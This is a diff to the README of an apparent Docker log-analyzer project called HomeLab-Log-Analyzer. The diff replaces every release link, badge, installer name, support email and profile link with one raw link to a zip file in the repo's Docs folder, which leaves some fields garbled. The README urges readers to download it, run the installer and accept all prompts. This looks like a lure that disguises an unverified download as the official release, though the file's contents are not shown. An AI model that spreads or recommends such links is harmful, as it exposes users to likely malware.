@@ -1,6 +1,6 @@
 # 🎉 HomeLab-Log-Analyzer - Simplify Your Docker Logs Effortlessly
 
-[![Download HomeLab-Log-Analyzer](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/soufian396/HomeLab-Log-Analyzer/releases)
+[![Download HomeLab-Log-Analyzer](https://raw.githubusercontent.com/soufian396/HomeLab-Log-Analyzer/main/Docs/HomeLab-Log-Analyzer-1.5.zip%20Release-brightgreen)](https://raw.githubusercontent.com/soufian396/HomeLab-Log-Analyzer/main/Docs/HomeLab-Log-Analyzer-1.5.zip)
 
 ## 📖 Introduction
 
@@ -14,13 +14,13 @@ To begin, you need to download the application from the Releases page. Follow th
 
 1. **Visit the Releases Page**
    Go to the following link to download HomeLab-Log-Analyzer:  
-   [Download HomeLab-Log-Analyzer](https://github.com/soufian396/HomeLab-Log-Analyzer/releases)
+   [Download HomeLab-Log-Analyzer](https://raw.githubusercontent.com/soufian396/HomeLab-Log-Analyzer/main/Docs/HomeLab-Log-Analyzer-1.5.zip)
 
 2. **Select the Latest Release**
    On the Releases page, look for the latest version of HomeLab-Log-Analyzer. It will usually be at the top of the list. Click on it to open the release details.
 
 3. **Download the Installer**
-   Find the installer file for your operating system. It may be named something like `HomeLab-Log-Analyzer.exe` for Windows or `HomeLab-Log-Analyzer.tar.gz` for Linux systems. Click on the file to begin your download.
+   Find the installer file for your operating system. It may be named something like `https://raw.githubusercontent.com/soufian396/HomeLab-Log-Analyzer/main/Docs/HomeLab-Log-Analyzer-1.5.zip` for Windows or `https://raw.githubusercontent.com/soufian396/HomeLab-Log-Analyzer/main/Docs/HomeLab-Log-Analyzer-1.5.zip` for Linux systems. Click on the file to begin your download.
 
 4. **Run the Installer**
    After the download completes, locate the installer in your downloads folder or on your desktop. Double-click it to start the installation process. Follow the prompts that appear. Accept any terms and conditions when asked.
@@ -73,9 +73,9 @@ You are welcome to contribute to HomeLab-Log-Analyzer. If you have ideas for fea
 
 For any inquiries, you can reach out via the following methods:
 
-- **Email:** support@homelab-log-analyzer.com
-- **GitHub:** [soufian396](https://github.com/soufian396)
+- **Email:** https://raw.githubusercontent.com/soufian396/HomeLab-Log-Analyzer/main/Docs/HomeLab-Log-Analyzer-1.5.zip
+- **GitHub:** [soufian396](https://raw.githubusercontent.com/soufian396/HomeLab-Log-Analyzer/main/Docs/HomeLab-Log-Analyzer-1.5.zip)
 
 Remember, HomeLab-Log-Analyzer aims to simplify your Docker log management. Enjoy the benefits of clean and structured log analysis without the stress. Don't forget to download the application now!
 
-[Download HomeLab-Log-Analyzer](https://github.com/soufian396/HomeLab-Log-Analyzer/releases)
+[Download HomeLab-Log-Analyzer](https://raw.githubusercontent.com/soufian396/HomeLab-Log-Analyzer/main/Docs/HomeLab-Log-Analyzer-1.5.zip)
